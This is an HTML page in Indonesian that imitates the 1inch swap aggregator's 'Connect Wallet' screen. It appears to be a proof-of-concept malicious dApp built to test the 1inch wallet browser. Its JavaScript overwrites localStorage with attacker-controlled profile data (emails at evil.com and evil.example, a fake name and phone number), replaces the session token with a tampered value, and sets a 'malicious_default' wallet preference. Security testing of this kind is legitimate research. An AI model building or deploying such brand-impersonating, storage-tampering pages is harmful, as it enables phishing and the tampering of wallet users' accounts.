<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>1inch Swap Aggregator - Connect Wallet</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; margin:0; padding:0; background:#0a0a0a; color:#fff; text-align:center; }
        .container { max-width: 480px; margin: 40px auto; padding: 20px; }
        button { width: 100%; padding: 18px; font-size: 18px; background: linear-gradient(90deg, #00ff9d, #00cc7a); color: #000; border: none; border-radius: 12px; font-weight: bold; margin: 15px 0; cursor: pointer; }
        .status { margin: 20px 0; padding: 15px; background: #1a1a1a; border-radius: 8px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>🔄 1inch Swap</h1>
        <p>Best rates • Multi-chain</p>
        
        <div class="status" id="status">Menunggu koneksi wallet...</div>
        
        <button onclick="connectWallet()">Connect Wallet</button>
        <button onclick="modifyProfile()">Update Profile (Test Sensitive Data)</button>
        
        <p style="margin-top:30px; font-size:14px; opacity:0.7;">
            Test ini mencoba memodifikasi data profil &amp; storage di 1inch Wallet Browser
        </p>
    </div>

    <script>
        const status = document.getElementById('status');

        function logToConsole(msg) {
            console.log('[1inch Malicious Test]', msg);
        }

        function connectWallet() {
            status.innerHTML = '✅ Wallet Connected!<br><small>Mengakses storage context...</small>';
            logToConsole('Simulasi connect wallet berhasil');
            
            // Real attempt: Modify common wallet storage keys
            try {
                // Data sensitif / non-sensitif yang biasa ada di wallet profile
                localStorage.setItem('user_email', 'victim_modified@evil.com');
                localStorage.setItem('user_phone', '+6281234567890');
                localStorage.setItem('user_name', 'Hacked User');
                localStorage.setItem('notification_settings', JSON.stringify({ email: true, push: true, marketing: true }));
                localStorage.setItem('profile_updated', new Date().toISOString());
                
                // Tambahan tampering
                localStorage.setItem('wallet_preference', 'malicious_default');
                
                status.innerHTML += '<br><strong style="color:#ff0">Storage berhasil dimodifikasi!</strong>';
                logToConsole('localStorage tampering berhasil');
            } catch(e) {
                status.innerHTML += '<br><strong style="color:red">Gagal modify storage: ' + e.message + '</strong>';
            }
        }

        function modifyProfile() {
            status.innerHTML = 'Mengubah detail profil pengguna...';
            
            try {
                // Modifikasi massal
                const sensitiveData = {
                    fullName: "Attacker Controlled",
                    email: "attacker@evil.example",
                    phone: "+62-812-0000-0000",
                    lastModified: Date.now(),
                    preferences: { theme: "dark", language: "id", notifications: "enabled" }
                };
                
                localStorage.setItem('user_profile', JSON.stringify(sensitiveData));
                localStorage.setItem('session_token', 'tampered_' + Math.random().toString(36));
                
                status.innerHTML = '✅ Detail sensitif pengguna telah diubah!<br>Sekarang cek apakah perubahan persist setelah reconnect atau restart wallet.';
                logToConsole('Profile data overwritten');
            } catch(e) {
                status.innerHTML = 'Error: ' + e.message;
            }
        }

        // Auto attempt saat halaman load (real scenario malicious dApp)
        window.onload = function() {
            setTimeout(() => {
                console.log('%c[1inch Test] Halaman malicious dimuat - mencoba akses storage', 'color: red; font-size: 16px');
            }, 800);
        };
    </script>
</body>
</html>
